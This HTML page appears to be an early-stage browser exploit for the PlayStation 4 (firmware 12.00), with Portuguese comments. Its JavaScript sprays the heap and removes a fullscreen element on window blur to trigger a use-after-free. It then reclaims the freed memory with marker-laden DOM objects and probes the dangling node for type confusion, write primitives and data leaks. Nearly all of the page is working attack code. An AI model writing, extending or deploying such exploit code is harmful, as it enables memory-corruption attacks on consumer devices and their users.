<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Type Confusion Stage</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Type Confusion</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];
function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (mantido)
// ==========================
function setupHeap(){
    for(let i=0;i<5000;i++){
        let t=new Float64Array(8);
        t[0]=i;
    }
}

// ==========================
// FULLSCREEN (inalterado)
// ==========================
function setupFullscreen(){

    let fsTarget=document.createElement("div");

    fsTarget.innerHTML =
        "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 CONFUSION RECLAIM
// ==========================
function confusionReclaim(size){

    log("[*] Confusion reclaim = "+size);

    let bucket=[];

    // churn inicial
    for(let i=0;i<3000;i++){
        let el=document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    for(let i=0;i<size;i++){

        let el;

        switch(i % 4){

            case 0:
                el=document.createElement("div");
                el.innerHTML =
                    "<h1>CTRL_"+i+"_41414141</h1>";
                break;

            case 1:
                el=document.createTextNode(
                    "TXT_"+i+"_BBBBBBBBBBBBBBBBBBBB"
                );
                document.body.appendChild(el);
                bucket.push(el);
                continue;

            case 2:
                el=document.createElement("svg");
                el.innerHTML =
                    "<circle cx='10' cy='10' r='5'></circle>";
                break;

            case 3:
                el=document.createElement("div");
                el.setAttribute("data-x","ATTR_"+i);
                break;
        }

        document.body.appendChild(el);
        bucket.push(el);
    }

    return bucket;
}

// ==========================
// 🔬 TYPE CONFUSION PROBE
// ==========================
function typeProbe(fsTarget){

    log("---- TYPE PROBE ----");

    try{

        let node = fsTarget.firstChild;

        if(!node){
            log("[!] sem child");
            return;
        }

        log("[CHECK] node = "+node);
        log("[CHECK] nodeType = "+node.nodeType);

        let isHTML = node instanceof HTMLElement;
        let isSVG  = node instanceof SVGElement;

        log("[CHECK] HTMLElement = "+isHTML);
        log("[CHECK] SVGElement = "+isSVG);

        // 🔥 DETECÇÕES IMPORTANTES
        if(node.nodeType === 3){
            log("[!!!] TEXTNODE REUSE");
        }

        if(isHTML && isSVG){
            log("[!!!] TYPE CONFUSION REAL");
        }

        // 🔥 tentativa de escrita
        try{
            node.innerHTML = "<b>AAAA</b>";
            log("[PWN] innerHTML write OK");
        }catch(e){
            log("[UAF] innerHTML crash");
        }

        // 🔥 acesso de layout (quebra comum)
        try{
            let r=node.getBoundingClientRect();
            log("[CHECK] rect = "+r.height);
        }catch(e){
            log("[UAF] rect crash");
        }

        // 🔥 leitura suspeita
        try{
            let v=node.textContent || node.nodeValue;
            log("[LEAK?] data = "+v);

            if(v && v.includes("4141")){
                log("[!!!] POSSIVEL LEAK");
            }

        }catch(e){
            log("[LEAK] crash");
        }

    }catch(e){
        log("[CRASH] type probe");
    }
}

// ==========================
// TRIGGER
// ==========================
function trigger(fsTarget){

    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){}

    // 🔥 múltiplos reclaim com tipos mistos
    setTimeout(()=>confusionReclaim(2000), 0);
    setTimeout(()=>confusionReclaim(2500), 50);
    setTimeout(()=>confusionReclaim(3000), 100);

    // 🔬 probes
    setTimeout(()=>typeProbe(fsTarget), 30);
    setTimeout(()=>typeProbe(fsTarget), 90);
    setTimeout(()=>typeProbe(fsTarget), 160);
    setTimeout(()=>typeProbe(fsTarget), 240);

    // 📜 log final
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),600);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Iniciando teste");

    setupHeap();

    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget),3000);
    };
}

</script>

</body>
</html>
